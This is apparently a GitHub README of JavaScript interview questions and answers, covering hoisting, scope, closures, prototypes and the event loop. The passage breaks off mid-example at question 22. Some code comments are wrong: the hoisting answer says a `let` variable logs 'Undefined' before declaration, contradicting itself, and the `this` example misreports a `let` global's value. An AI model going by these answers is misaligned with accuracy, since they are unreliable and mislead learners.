https://github.com/Devinterview-io/javascript-interview-questions


# 100 Common JavaScript Interview Questions in 2025

<div>
<p align="center">
<a href="https://devinterview.io/questions/web-and-mobile-development/">
<img src="https://firebasestorage.googleapis.com/v0/b/dev-stack-app.appspot.com/o/github-blog-img%2Fweb-and-mobile-development-github-img.jpg?alt=media&token=1b5eeecc-c9fb-49f5-9e03-50cf2e309555" alt="web-and-mobile-development" width="100%">
</a>
</p>

#### You can also find all 100 answers here 👉 [Devinterview.io - JavaScript](https://devinterview.io/questions/web-and-mobile-development/javascript-interview-questions)

<br>

# JavaScript Fundamentals (1-10)

## 1. What are the _data types_ present in JavaScript?

JavaScript has **primitive** and **composite** data types.

### Primitive Data Types

- **Boolean**: Represents logical values of **true** or **false**.
- **Null**: Denotes the lack of a value.

- **Undefined**: Indicates a variable that has been declared but has not been assigned a value.

- **Number**: Represents numeric values, including integers and floats.

- **BigInt**: Allows for representation of integers with arbitrary precision.

- **String**: Encapsulates sequences of characters.

- **Symbol** (ES6): Provides a unique, immutable value.

### Composite Data Types

- **Object**: Represents a set of key-value pairs and is used for more complex data structures.
- **Function**: A callable object that can be defined using regular function syntax or using the `new Function()` constructor (rarely used).

### Notable Characteristics

- JavaScript is **dynamically-typed**, meaning the data type of a variable can change during the execution of a program.
- **Data type coercion** can occur, where values are implicitly converted from one type to another in specific contexts, such as during comparisons.
- Arithmetic operations, particularly when one of the operands is a string, can lead to **implicit type conversions**.
<br>

## 2. What is the difference between _null_ and _undefined_?

While both **null** and **undefined** represent "no value" in JavaScript, they are distinct in their roles and origins.

### Origin and Context

- **null** usually denotes an intentionally **absent** value, and developers can set a variable to null to signify the absence of an object or a value. For example, if an API call doesn't return data, you might set a variable to null.

- **undefined** typically indicates a variable that has been declared but not yet been assigned a value, or a property that doesn't exist on an object.

### Variable Initialization and Assignment

- Variables that haven't been assigned a value are `undefined` by default, unless explicitly set to `null`.
  ```javascript
  let foo; // undefined
  let bar = null; // null
  ```

### Function Arguments

- When a function is called, and the parameter isn't provided or its value is not set, the parameter is `undefined`. 
- **null** would instead be an explicit value provided as an argument.

### Object Properties

- If you try to access a property on an object that doesn't exist, the result is `undefined`.
  ```javascript
  let obj = {};
  console.log(obj.nonExistentProperty); // undefined
  ```

- **Null** can be used to clear a property value in an object that was previously set.
  ```javascript
  let obj = { prop: 'value' };
  obj.prop = null;
  ```

### The Equality Operation

- In JavaScript, **undefined** and **null** are treated as equal when using loose equality (==) but not strict equality (===).

### Use-Cases and Best Practices

- When you initialize a variable and are not ready to assign a meaningful value, it's more common to use **undefined** instead of **null** to indicate that the value isn't there yet.
- For example, if you declare a user object but don't have their details yet, you might keep it as `undefined`.

### Code Example

Here is the JavaScript code:

```javascript
let var1;
let var2 = null;

let object = {
  a: 1,
  b: undefined
};

function test(arg1, arg2) {
  console.log(arg1);  // undefined: not provided
  console.log(arg2);  // null: provided as such
}

function clearProperty(prop) {
  delete object[prop];
}

console.log(var1);     // undefined
console.log(var2);     // null
console.log(object.a); // 1
console.log(object.b); // undefined
console.log(object.c); // undefined

test();               // Both arguments are undefined
test(1, null);        // arg1 is 1, arg2 is null

clearProperty('b');  // Removes property 'b' from object
console.log(object.b); // undefined: Property 'b' was removed, not set to null
```
<br>

## 3. How does JavaScript handle _type coercion_?

**Type Coercion** in JavaScript refers to the automatic conversion of values from one data type to another.

### Explicit and Implicit Coercion

- **Explicit**: Achieved through methods such as `parseInt()`, `Number()`, and `toString()`.
- **Implicit**: Automatically occurs during operations or comparisons. For example, combining a string and a number in an addition results in the automatic conversion of the number to a string.

### Common Coercion Scenarios

1. **Arithmetic Operations**: Strings are coerced to numbers.
    - **Example**: `"5" - 3` evaluates to `2`, as the string is coerced to a number.
    
2. **Loose Equality (==)**: Data types are often modified for comparisons.
    - **Example**: `"4" == 4` is `true` due to string coercion before the comparison.

3. **Conditionals** (if and Ternary Operators): Truthiness or falsiness is determined.
    - **Example**: `if(1)` evaluates to `true` because `1` coerces to `true`.

4. **Logical Operators**: Non-boolean values are coerced to booleans.
    - **Example**: `"hello" && 0` evaluates to `0` because the truthy `"hello"` short-circuits the `&&` operation, and `0` coerces to `false`.
<br>

## 4. Explain the concept of _hoisting_ in JavaScript.

**Hoisting** is a JavaScript mechanism that involves moving variable and function declarations to the top of their containing scope **during the compile phase**. However, the assignments to these variables or the definitions of functions remain in place.

For instance, even though the call to `myFunction` appears before its definition, hoisting ensures that it doesn't cause an error.

### Hoisting in Action

Here's a Code Example:

```javascript
console.log(myVar); // Undefined
var myVar = 5;

console.log(myVar); // 5

// The above code is equivalent to the following during the compile phase:
// var myVar;
// console.log(myVar);
// myVar = 5;

console.log(sayHello()); // "Hello, World!"
function sayHello() {
    return "Hello, World!";
}

// The above code is equivalent to the following during the compile phase:
// function sayHello() {
//     return "Hello, World!";
// }
// console.log(sayHello());
```

### Why Hoisting Matters

Understanding hoisting can help you prevent certain unexpected behaviors in your code. For example, it can shed light on unexpected "undefined" values that might appear even after a variable is declared and initialized.

#### Global Scope and Hoisting

In the global scope, variables declared with `var` and functions are always hoisted to the top. For example:

```javascript
// During the compile phase, the following global declarations are hoisted:
// var globalVar;
// function globalFunction() {}

console.log(globalVar); // Undefined
console.log(globalFunction()); // "Hello, Global!"
var globalVar = "I am global Var!";
function globalFunction() {
    return "Hello, Global!";
}
```

#### Local Scope and Hoisting

Variables and functions declared in local scopes within functions are also hoisted to the top of their scope.

Here's a Code Example:

```javascript
function hoistingInLocalScope() {
    // These local declarations are hoisted during the compile phase:
    // var localVar;
    // function localFunction() {}

    console.log(localVar); // Undefined
    localVar = "I am a local var!";
    console.log(localFunction()); // "Hello, Local!"

    var localVar;
    function localFunction() {
        return "Hello, Local!";
    }
}
```

### Best Practices

To write clean, readable code, it's important to:

- Declare variables at the top of your scripts or functions to avoid hoisting-related pitfalls.
- Initialize variables before use, **regardless of hoisting**, to ensure predictable behavior.

### ES6 and Hoisting

With the introduction of `let` and `const` in ES6, JavaScript's behavior has adapted. Variables declared using `let` and `const` are still hoisted, but unlike `var`, they are **not initialized**.

Here's an Example:

```javascript
console.log(myLetVar); // ReferenceError: Cannot access 'myLetVar' before initialization
let myLetVar = 5;
```

### Constants and Hoisting

`const` and `let` behave similarly when hoisted, but their difference lies in the fact that `const` must be assigned a value at the time of declaration, whereas `let` does not require an initial value.

Here's an Example:

```javascript
console.log(myConstVar); // ReferenceError: Cannot access 'myConstVar' before initialization
const myConstVar = 10;

console.log(myLetVar); // Undefined
let myLetVar = 5;
```
<br>

## 5. What is the _scope_ in JavaScript?

**Scope** defines the accessibility and lifetime of variables in a program. In JavaScript, there are two primary types: **Global Scope** and **Local Scope**.

### Global Scope

Any variable declared **outside of a function** is in the global scope. These can be accessed from both within functions and from other script tags.

#### Example: Global Scope

Here is the JavaScript code:

```javascript
let globalVar = 'I am global';

function testScope() {
    console.log(globalVar); // Output: 'I am global'
}

testScope();
console.log(globalVar); // Output: 'I am global'
```

### Local Scope

Variables declared within a **function** (using `let` or `const` or prior to JavaScript ES6 with `var`) have local scope, meaning they are only accessible within that function.

#### Example: Local Scope

Here is the JavaScript code:

```javascript
function testScope() {
    let localVar = 'I am local';
    console.log(localVar); // Output: 'I am local'
}

// This statement will throw an error because localVar is not defined outside the function scope
// console.log(localVar);
```

### Block Scope

Starting from **ES6**, JavaScript also supports block scope, where variables defined inside code blocks (denoted by `{}` such as loops or conditional statements) using `let` or `const` are accessible only within that block.

#### Example: Block Scope

Here is the JavaScript code:

```javascript
function testScope() {
    let localVar = 'I am local';
    if (true) {
        let blockVar = 'I am local to this block';
        console.log(localVar, blockVar); // Both will be accessible
    }
    // This statement will throw an error because blockVar is not defined outside the block scope
    // console.log(blockVar);
}

testScope();
```
<br>

## 6. What is the difference between `==` and `===`?

**Strict equality** (`===`) in JavaScript requires both value and type to match, testing for more specific conditions and reducing the likelihood of unexpected results.

In contrast, the **abstract equality** comparison (`==`) can lead to type coercion, potentially causing counterintuitive outcomes.

While both comparison modes test value equality, `===` ensures an additional match of data type.

### Illustrative Example: Abstract vs. Strict Equality

- Abstract Equality: 
    - `5 == '5'` evaluates to `true` because JavaScript converts the string to a number for comparison.
- Strict Equality:
    - `5 === '5'` evaluates to `false` because the types are not the same.

### Key Considerations

- **Type Safety**: `===` is safer as it avoids unwanted type conversions.
- **Performance**: `===` can be faster, especially for simple comparisons, as it doesn't involve type coercion or additional checks.
- **Clarity**: Favoring `===` can make your code clearer and more predictable.

### Common Best Practices

- **Use Strict Equality by Default**: This approach minimizes unintended side effects.
- **Consider Type Coercion Carefully**: In specific cases or with proven understanding, `==` can be suitable, but be cautious about potential confusion.

### Code Example: Equality Operators

Here is the JavaScript code:

```javascript
// Abstract equality
console.log('5' == 5);      // true
console.log(null == undefined);  // true
console.log(0 == false);    // true

// Strict equality
console.log('5' === 5);     // false
console.log(null === undefined); // false
console.log(0 === false);   // false
```
<br>

## 7. Describe _closure_ in JavaScript. Can you give an example?

In JavaScript, **closures** enable a **function** to access its outer scope, retaining this access even after the parent function has finished executing. This mechanism provides a powerful tool for data encapsulation and privacy.

### Core Concept

When a **function** is defined within another function, it maintains a reference to the variables from the outer function, even after the outer function has completed execution and its local variables are typically no longer accessible.

### Key Components

1. **Outer Function (Parent function)**: It contains the inner functions or closures.
2. **Inner Function (Closure)**: Defined within the parent function, it references variables from the outer function.
3. **Lexical Environment**: The context where the inner function is defined, encapsulating the scope it has access to.

### Example: Password Generator

Consider a simple scenario of a function in charge of generating a secret password:

1. The outer function, `generatePassword`, defines a local variable, `password` and returns an inner function `getPassword`.
2. The inner function, `getPassword`, has exclusive access to the `password` variable even after `generatePassword` has executed.

Here is the JavaScript code:

```javascript
function generatePassword() {
  let password = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const passwordLength = 8;
  for(let i = 0; i < passwordLength; i++) {
    password += characters.charAt(Math.floor(Math.random() * characters.length));
  }

  return function getPassword() {
      return password;
  };
}

const getPassword = generatePassword();

console.log(getPassword()); // Outputs the generated password.
```

In this example, `getPassword` still has access to the `password` variable after the `generatePassword` function has completed, thanks to the closure mechanism.

### Application

- **Data Privacy**: JavaScript design patterns like the Module and Revealing Module Patterns use closures to keep data private.

- **Timeouts and Event Handlers**: Closures help preserve the surrounding context in asynchronous operations such as `setTimeout` and event handlers.

### Pitfalls to Avoid

- **Memory Leakage**: If not used carefully, closures can cause memory leaks, as the outer function's variables continue to live in memory because of the closure link.
- **Stale Data**: Be mindful of shared variables that might change after a closure has been defined, leading to unexpected behavior.

### Browser Compatibility

The concept of closures is a fundamental aspect of the JavaScript language and is supported by all modern browsers and environments.
<br>

## 8. What is the '_this_ keyword' and how does its context change?

In JavaScript, the context of **`this`** refers to the execution context, typically an object that owns the function where `this` is used.

### 'this' in the Global Scope

In **non-strict** mode, `this` in the global scope refers to the `window` object. In **strict** mode, `this` is `undefined`.

### 'this' in Functions

In **non-arrow functions**, the value of `this` depends on how the function is **invoked**. When invoked:

- As a method of an object: `this` is the object.
- Alone: In a browser, `this` is `window` or `global` in Node.js. In strict mode, it's `undefined`.
- With `call`, `apply`, or `bind`: `this` is explicitly set.
- As a constructor (with `new`): `this` is the newly created object.

### 'this' in Arrow Functions

Arrow functions have a **fixed context** for `this` defined at **function creation** and are not changed by how they are invoked.

- They do **not have** their own `this`.
- They use the `this` from their surrounding lexical context (the enclosing function or global context).

### Code Example: Global Context

Here is the JavaScript code:

```javascript
// Main
let globalVar = 10;

function globalFunction() {
    console.log('Global this: ', this.globalVar);
    console.log('Global this in strict mode: ', this);
}

globalFunction();  // Output: 10, window or undefined (in strict mode)

// In Node.js, it will be different, because "window" is not defined. But "this" will refer to the global object.
```
<br>

## 9. What are _arrow functions_ and how do they differ from regular functions?

Let's look at the key features of **arrow functions** and how they differ from traditional functions in JavaScript.

### Arrow Functions: Key Features

- **Concise Syntax**:
  - Especially useful for short, one-liner functions.
  - No need for `function` keyword or **braces** if there's a single expression.  
  
- **Implicit Return**:
  - When there's no explicit `{ return ... ;}` statement, arrow functions return the result of the single expression inside.

- **`this` Binding**:
  - Does not have its **own `this`**. It's "inherited" from the surrounding (lexical) context. This feature is known as '**lexical scoping**'.

### Code Example: Standard Function vs. Arrow Function

Here is the JavaScript code:

```javascript
// Standard Function
function greet(name) {
  return "Hello, " + name + "!";
}

// Arrow Function
const greetArrow = name => "Hello, " + name + "!";
```

In the code above, `greet` is a standard function, while `greetArrow` is an arrow function, showcasing the difference in syntax and required keywords.

### When to Use Arrow Functions

- **Event Handlers**: Ideal for concise, inline event handling, where `this` context can be inherited from the lexical scope.

- **Callback Functions**: Useful for array methods like `map`, `filter`, and `reduce`.

- **Avoidance of `this` Redefinition**: When you want to maintain the surrounding context of `this` and avoid unintended redefinition.

### Code Example: Arrow Function and `this` Context

Here is the JavaScript code:

```javascript
// Using traditional functions
document.getElementById('myButton').onclick = function() {
  console.log('Button clicked:', this);  // Refers to the button element
};

// Using arrow functions
document.getElementById('myButton').onclick = () => {
  console.log('Button clicked:', this);  // Refers to the global/window object
};
```

In the arrow function example, the context of `this` does not refer to the button element, but to the global `window` object, because arrow functions do not have their own binding of `this`. Instead, they inherit `this` from their lexical scope, which in this case is the global context.
<br>

## 10. What are _template literals_ in JavaScript?

**Template literals** are a feature in modern JavaScript versions that offer a more flexible and readable way to work with strings. They are often referred to as "template strings".

### Key Features

- **Multiline Text**: Template literals support multiline strings without requiring escape characters or string concatenation with a `+` sign.
- **String Interpolation**: They enable the seamless embedding of JavaScript expressions within strings, using `${}`.

### Syntax

- **Single Versus Double Quotes**: For template literals, use backticks (\`) instead of single quotes ('') or double quotes ("").
- **Placeholder**: The `${expression}` placeholder within the backticks allows for variable and expression injection.

### Example:

```javascript
let name = "John";
let message = `Hi ${name}!`;

console.log(message);  // Output: "Hi John!"
```

### Benefits

- **Readability**: They can make code more understandable, especially when dealing with longer or complex strings, by keeping content closer to its intention.
- **Interpolation & Expression**: Template literals reduce verbosity and rendering logic when integrating dynamic data.

### Code Example: Multiline Text and String Interpolation

```javascript
// Regular String
let poem = "Roses are red,\nViolets are blue,\nSugar is sweet,\nAnd so are you.";

// Template Literal
let poemTemplate = `
  Roses are red,
  Violets are blue,
  Sugar is sweet,
  And so are you.
`;
```

### Browser Compatibility Concerns

Template literals are universally supported in modern browsers and are now considered a **core JavaScript feature**. However, they may not work in older browsers such as Internet Explorer without transpilation or polyfilling.
<br>

# JavaScript Functions and Higher-Order Functions (11-15)

## 11. What is a _higher-order function_ in JavaScript?

A **higher-order function** in JavaScript is a function that can take other functions as arguments or can return functions. This feature enables functional programming paradigms such as `map`, `reduce`, and `filter`. Higher-order functions offer versatility and modularity, fostering streamlined, efficient code.

### Key Characteristics

- **First-class functions**: Functions in JavaScript are considered first-class, meaning they are a legitimate data type and can be treated like any other value, including being assigned to variables, stored in data structures, or returned from other functions.

- **Closure support**: Due to closures, a higher-order function can transport not just the enclosed data within the function definition, but also the lexical environment in which that data resides.

- **Dynamic code**: Because JavaScript allows functions to be dynamically constructed and named, they can be dynamically passed to higher-order functions.

### Practical Applications

- **Callback Execution**: Functions like `setTimeout` and `addEventListener` take a function as an argument and are thus higher-order.

- **Event Handling**: Many event-driven systems leverage higher-order functions for tasks such as event subscription and emission.

- **Iterative Operations**: The `map`, `filter`, and `reduce` functions in JavaScript operate on arrays and require functions to be passed, making them higher-order.

- **Code Abstraction**: Higher-order functions enable the encapsulation of repetitive tasks, promoting cleaner, more readable code.

### Code Example: Higher-order Functions

Here is the JavaScript code:

```javascript
// Simple higher-order function
function multiplier(factor) {
  return function(num) {
    return num * factor;
  };
}

// Invoke a higher-order function
const twice = multiplier(2);
console.log(twice(5));  // Output: 10

// Functional programming with higher-order functions
const numbers = [1, 2, 3, 4, 5];
const doubled = numbers.map(multiplier(2));  // [2, 4, 6, 8, 10]
const tripled = numbers.map(multiplier(3));  // [3, 6, 9, 12, 15]
```
<br>

## 12. Can functions be assigned as values to variables in JavaScript?

Yes, **JavaScript** supports first-class functions, meaning **functions can be treated as variables** and then assigned to other variables or passed as arguments to other functions.

Functions defined as regular functions or arrow functions are both first-class in JavaScript. 

### Practical Code Example

Here is the JavaScript code:

```javascript
// Define a function
function greet() {
  console.log('Hello!');
}

// Assign the function to a variable
let sayHello = greet;

// Call the function through the variable
sayHello();  // Output: "Hello!"

// Reassign the variable to a new function
sayHello = function() {
  console.log('Bonjour!');
};

// Call it again to see the new behavior
sayHello();  // Output: "Bonjour!"
```

### Practical Use Cases

- **Callbacks**: Functions can be passed as parameters to other functions.
  
- **Event Handling**: In web development, functions define how to respond to specific events, and these functions are often attached to event listeners.

- **Modular Development**: In programming patterns like the Module pattern, functions are defined within a scope and then returned, similar to variables.

- **Higher-Order Functions**: These functions operate on other functions, taking them as arguments or returning them, and are an essential part of many modern JavaScript libraries and frameworks.
<br>

## 13. How do _functional programming_ concepts apply in JavaScript?

**Functional Programming** (FP) concepts in JavaScript are a direct result of the language's first-class functions. Key FP principles, such as immutability, pure functions, and **declarative** style, play a crucial role.

### Core Concepts

#### First-Class Functions and Higher-Order Functions

JavaScript treats functions as first-class citizens, allowing them to be assigned to variables, passed as parameters, and returned from other functions. This feature is foundational to FP in the language.

#### Code Example:

Here is the JavaScript code:

```javascript
const sayHello = () => console.log('Hello!');
const runFunction = (func) => func();

runFunction(sayHello);  // Output: "Hello!"
```
<br>

## 14. What are _IIFEs_ (Immediately Invoked Function Expressions)?

The **Immediately Invoked Function Expression** (IIFE) design pattern employs an anonymous function that gets executed promptly after its definition.

Key characteristics of IIFEs include localized variable scopes and immediate activation upon interpreter parsing.

### Code Example: IIFE

Here is the JavaScript code:

```javascript
(function(){
    var foo = 'bar';
    console.log(foo);
})();
```

In this example, the function is enclosed within parentheses, ensuring the enclosed function is evaluated as an expression. Subsequently, it is invoked with a trailing pair of parentheses.

### Core Functions of IIFE

1. **Encapsulation**: Through lexical scoping, IIFEs safeguard variables from leaking into the global scope. This, in turn, averts unintended variable tampering in the global context.

2. **Data Hiding**: Internal functions or data can be hidden from external access, providing a mechanism for information concealment and access control.

3. **Initialization**: The IIFE structure is ideal for setting up initial conditions, like binding events or pre-processing data.

### Use Cases

- **Avoiding Variable Pollution**: When interfacing with libraries or inserting code snippets, IIFEs prevent global scope pollution.

- **Module Patterns**: IIFEs, in combination with **closures**, lay the groundwork for modular code organization by shielding private variables and functions.

### Modern Alternatives

With the introduction of ES6 and its `let` and `const` declarations, as well as block-scoped lexical environments, the necessity of IIFEs has reduced. Additionally, **arrow functions** provide a more concise method for defining immediately invoked functions.

### IIFE Variants

1. **Parentheses Invocation**: A pair of parentheses immediately invoke the enclosed function. While this approach is more extensive, it's devoid of self-documenting advantages.
    ```javascript
    (function(){
        console.log('Invoked!');
    })();
    ```

2. **Wrapping in Operators**: Similar to using parentheses for invocation, the `!`, `+`, or `-` operators are sometimes used for invoking clarity. For instance:
    ```javascript
    !function(){
        console.log('Invoked!');
    }();
    ```

3. **Named IIFE**: Though not as common, naming an IIFE can assist with self-referencing. This is most effective when the intention is to have a more comprehensive stack trace during debugging.
    ```javascript
    (function factorial(n){
        if (n <= 1) return 1;
        return n * factorial(n-1);
    })(5);
    ```

#### Caution on Minification

When leveraging IIFEs, exercise caution while using minifiers to shrink JavaScript files. Minification might lead to unintended outcomes, altering the previous scope expectations.
<br>

## 15. How do you create _private variables_ in JavaScript?

In JavaScript, encapsulating private state within an object can be achieved using a **closure**. This ensures the state is local to the object and not directly accessible from outside.

### How Closures Work

A **closure** allows a function to retain access to the **lexical environment** (the set of variable bindings at the point of function declaration) in which it was defined, even when the function is executed outside that lexical environment.

This means that any **inner function**, defined inside another function, has access to the **outer function's variables**, and that access is maintained even after the outer function has finished executing.

For example:
```javascript
function outerFunction() {
    let outerVar = 'I am outer';  // This variable is in the lexical environment of outerFunction

    function innerFunction() {
        console.log(outerVar);  // Accesses outerVar from the lexical environment of outerFunction
    }

    return innerFunction;
}

let myInnerFunction = outerFunction();
myInnerFunction();  // Logs: "I am outer"
```

Here, `innerFunction` retains access to `outerVar`.

### Practical Implementation with Constructor Functions and Modules

#### Constructor Functions

When defining a JavaScript **constructor function** with `function` and `new`, closure can be used to associate private state with each instance:

```javascript
function Gadget() {
    let secret = 'top secret';
    this.setSecret = function (value) {
        secret = value;
    };
    this.getSecret = function () {
        return secret;
    };
}

let phone = new Gadget();
phone.setSecret('new secret');
console.log(phone.getSecret());  // 'new secret'
```

In this example, `secret` is private to each `Gadget` instance, thanks to closure.

#### Modules

In modern JavaScript, **module patterns** combined with **immediately-invoked function expressions** (IIFE) are often used for encapsulation and data hiding.

- The **revealing module pattern** enables selective exposure of private members.

- The **IIFE pattern** immediately executes and returns the object to be assigned, effectively creating a module.

Here is the code:

```javascript
let myModule = (function () {
    let privateVariable = 'I am private';

    function privateMethod() {
        console.log('I am a private method');
    }

    return {
        publicMethod: function () {
            console.log('I am a public method');
        },
        getPrivateVariable: function () {
            return privateVariable;
        }
    };
})();

console.log(myModule.getPrivateVariable());  // 'I am private'
myModule.privateMethod();  // Throws an error because privateMethod is not exposed
```

In this example, `privateVariable` and `privateMethod` are accessible only within the IIFE's lexical environment, thus making them private.

JavaScript tools like TypeScript and Babel also offer modules such as `module.export`, providing additional options for encapsulation.
<br>

# JavaScript Objects and Prototypes (16-20)

## 16. How do you create an object in JavaScript?

JavaScript provides multiple ways to create objects, each suited for different scenarios.

### Object Creation Methods

1. **Object Literals**: The simplest and most common approach for creating single objects.
    ```javascript
    let person = {
        name: 'John',
        age: 30,
        greet: function() {
            console.log('Hello!');
        }
    };
    ```

2. **Object Constructor**: Using the `new Object()` syntax.
    ```javascript
    let person = new Object();
    person.name = 'John';
    person.age = 30;
    ```

3. **Constructor Functions**: For creating multiple instances with shared structure.
    ```javascript
    function Person(name, age) {
        this.name = name;
        this.age = age;
        this.greet = function() {
            console.log('Hello, ' + this.name);
        };
    }
    let john = new Person('John', 30);
    ```

4. **Object.create()**: Creates a new object with a specified prototype.
    ```javascript
    let personPrototype = {
        greet: function() {
            console.log('Hello!');
        }
    };
    let person = Object.create(personPrototype);
    person.name = 'John';
    ```

5. **ES6 Classes**: Modern syntax for constructor functions.
    ```javascript
    class Person {
        constructor(name, age) {
            this.name = name;
            this.age = age;
        }
        greet() {
            console.log('Hello, ' + this.name);
        }
    }
    let john = new Person('John', 30);
    ```

6. **Factory Functions**: Functions that return new objects.
    ```javascript
    function createPerson(name, age) {
        return {
            name: name,
            age: age,
            greet() {
                console.log('Hello, ' + this.name);
            }
        };
    }
    let person = createPerson('John', 30);
    ```

<br>

## 17. What are prototypes in JavaScript?

A **prototype** is an object from which other objects inherit properties and methods. Every JavaScript object has an internal link to another object called its prototype.

### How Prototypes Work

When you try to access a property on an object, JavaScript first looks for it on the object itself. If not found, it searches the object's prototype, then the prototype's prototype, and so on up the **prototype chain** until it reaches `null`.

```javascript
function Person(name) {
    this.name = name;
}

Person.prototype.greet = function() {
    console.log('Hello, my name is ' + this.name);
};

let john = new Person('John');
john.greet();  // 'Hello, my name is John'
```

### Key Concepts

- **`__proto__`**: The actual object used in the prototype chain lookup (deprecated in favor of `Object.getPrototypeOf()`).

- **`prototype`**: A property of constructor functions that becomes the prototype of instances created with `new`.

- **Prototype Chain**: The series of links between objects and their prototypes, ending with `Object.prototype` and then `null`.

```javascript
console.log(john.__proto__ === Person.prototype);  // true
console.log(Person.prototype.__proto__ === Object.prototype);  // true
console.log(Object.prototype.__proto__);  // null
```

### Benefits

Prototypes enable memory efficiency by allowing multiple instances to share methods rather than each instance having its own copy of every method.

<br>

## 18. Explain prototypal inheritance.

**Prototypal inheritance** is JavaScript's mechanism for objects to inherit properties and methods from other objects through the prototype chain.

### How It Works

When an object inherits from another, it gains access to the parent object's properties and methods without duplicating them. This creates a delegation model where objects delegate property lookups to their prototypes.

```javascript
function Animal(name) {
    this.name = name;
}

Animal.prototype.eat = function() {
    console.log(this.name + ' is eating');
};

function Dog(name, breed) {
    Animal.call(this, name);  // Call parent constructor
    this.breed = breed;
}

// Set up inheritance
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;

Dog.prototype.bark = function() {
    console.log(this.name + ' is barking');
};

let myDog = new Dog('Rex', 'Labrador');
myDog.eat();   // 'Rex is eating' (inherited from Animal)
myDog.bark();  // 'Rex is barking' (own method)
```

### ES6 Class Syntax

Modern JavaScript provides cleaner syntax for prototypal inheritance:

```javascript
class Animal {
    constructor(name) {
        this.name = name;
    }
    
    eat() {
        console.log(this.name + ' is eating');
    }
}

class Dog extends Animal {
    constructor(name, breed) {
        super(name);  // Call parent constructor
        this.breed = breed;
    }
    
    bark() {
        console.log(this.name + ' is barking');
    }
}

let myDog = new Dog('Rex', 'Labrador');
myDog.eat();   // 'Rex is eating'
myDog.bark();  // 'Rex is barking'
```

### Key Points

- Objects inherit from objects, not classes (though ES6 classes are syntactic sugar over prototypes).
- Changes to a prototype affect all objects inheriting from it.
- You can override inherited properties and methods by defining them on the child object.

<br>

## 19. What is the difference between object literals and constructor functions?

**Object literals** and **constructor functions** are two distinct approaches for creating objects, each with specific use cases and characteristics.

### Object Literals

Object literals create a single, unique object instance using curly brace notation.

```javascript
let person = {
    name: 'John',
    age: 30,
    greet: function() {
        console.log('Hello, ' + this.name);
    }
};
```

**Characteristics:**
- Simple and concise syntax
- Best for creating single objects
- No inheritance setup required
- Methods are defined directly on the object
- Cannot easily create multiple similar objects

### Constructor Functions

Constructor functions are templates for creating multiple object instances with shared structure and behavior.

```javascript
function Person(name, age) {
    this.name = name;
    this.age = age;
}

Person.prototype.greet = function() {
    console.log('Hello, ' + this.name);
};

let john = new Person('John', 30);
let jane = new Person('Jane', 25);
```

**Characteristics:**
- Enables creation of multiple similar objects
- Methods defined on prototype are shared across instances (memory efficient)
- Supports inheritance through prototype chain
- Requires the `new` keyword for instantiation
- Can accept parameters for customization

### Key Differences

| Aspect | Object Literals | Constructor Functions |
|--------|----------------|----------------------|
| Purpose | Single object | Multiple instances |
| Reusability | Low | High |
| Memory efficiency | N/A | High (shared methods) |
| Inheritance | Manual setup | Built-in support |
| Syntax complexity | Simple | Moderate |

### When to Use Each

- **Object Literals**: Configuration objects, single-use objects, simple data structures
- **Constructor Functions**: Creating multiple similar objects, when inheritance is needed, building object-oriented systems

<br>

## 20. How do you add or remove properties from an object?

JavaScript provides multiple ways to dynamically add or remove properties from objects.

### Adding Properties

1. **Dot Notation**: Simple and readable for valid identifier names.
    ```javascript
    let person = {};
    person.name = 'John';
    person.age = 30;
    ```

2. **Bracket Notation**: Required for dynamic property names or names with special characters.
    ```javascript
    let person = {};
    person['name'] = 'John';
    person['favorite color'] = 'blue';
    
    let prop = 'age';
    person[prop] = 30;  // Dynamic property name
    ```

3. **Object.defineProperty()**: For adding properties with specific descriptors.
    ```javascript
    let person = {};
    Object.defineProperty(person, 'name', {
        value: 'John',
        writable: true,
        enumerable: true,
        configurable: true
    });
    ```

4. **Spread Operator (ES6)**: Creates a new object with additional properties.
    ```javascript
    let person = { name: 'John' };
    person = { ...person, age: 30, city: 'New York' };
    ```

### Removing Properties

1. **delete Operator**: Removes a property from an object.
    ```javascript
    let person = { name: 'John', age: 30, city: 'New York' };
    delete person.age;
    console.log(person);  // { name: 'John', city: 'New York' }
    ```

2. **Setting to undefined**: Keeps the property but removes its value.
    ```javascript
    person.city = undefined;  // Property exists but is undefined
    ```

3. **Destructuring (ES6)**: Creates a new object without specific properties.
    ```javascript
    let person = { name: 'John', age: 30, city: 'New York' };
    let { age, ...newPerson } = person;
    console.log(newPerson);  // { name: 'John', city: 'New York' }
    ```

### Checking Property Existence

```javascript
let person = { name: 'John', age: 30 };

// hasOwnProperty (own properties only)
console.log(person.hasOwnProperty('name'));  // true

// in operator (includes inherited properties)
console.log('name' in person);  // true

// Object.hasOwn() (modern alternative)
console.log(Object.hasOwn(person, 'name'));  // true
```

<br>

# Asynchronous JavaScript (21-25)

## 21. What is the event loop in JavaScript?

The **event loop** is the mechanism that enables JavaScript to perform non-blocking asynchronous operations despite being single-threaded. It continuously monitors the call stack and task queues, coordinating the execution of code.

### How the Event Loop Works

JavaScript has several key components that work together:

1. **Call Stack**: Where function execution contexts are pushed and popped (LIFO - Last In, First Out).

2. **Web APIs**: Browser-provided APIs (setTimeout, fetch, DOM events) that handle asynchronous operations.

3. **Callback Queue (Task Queue/Macrotask Queue)**: Holds callbacks from completed asynchronous operations like setTimeout, setInterval, I/O operations.

4. **Microtask Queue (Job Queue)**: Holds microtasks like Promise callbacks and MutationObserver callbacks. Has higher priority than the callback queue.

### Execution Flow

```javascript
console.log('Start');

setTimeout(() => {
    console.log('Timeout');
}, 0);

Promise.resolve()
    .then(() => {
        console.log('Promise');
    });

console.log('End');

// Output:
// Start
// End
// Promise
// Timeout
```

**Step-by-step execution:**
1. `console.log('Start')` executes immediately (synchronous)
2. `setTimeout` callback is sent to Web API, then to callback queue after 0ms
3. Promise callback is added to microtask queue
4. `console.log('End')` executes immediately
5. Call stack is empty; event loop checks microtask queue first
6. 'Promise' logs (microtask has priority)
7. Event loop checks callback queue
8. 'Timeout' logs

### Key Rules

- The event loop only processes queued tasks when the call stack is empty.
- Microtasks are processed completely before any macrotasks.
- Each macrotask is followed by processing all pending microtasks.
- Long-running synchronous code blocks the event loop.

<br>

## 22. Explain how callbacks work in JavaScript.

A **callback** is a function passed as an argument to another function, to be executed at a later time. Callbacks are fundamental to JavaScript's asynchronous programming model.

### Basic Callback Pattern

```javascript
function fetchData(callback) {
    setTimeout(() => {
        let data = { name: 'John', age: 30 };
        callback(data);
    }, 1000);
}

fetchData(function(result) {
    console.log('Received:', result);
});
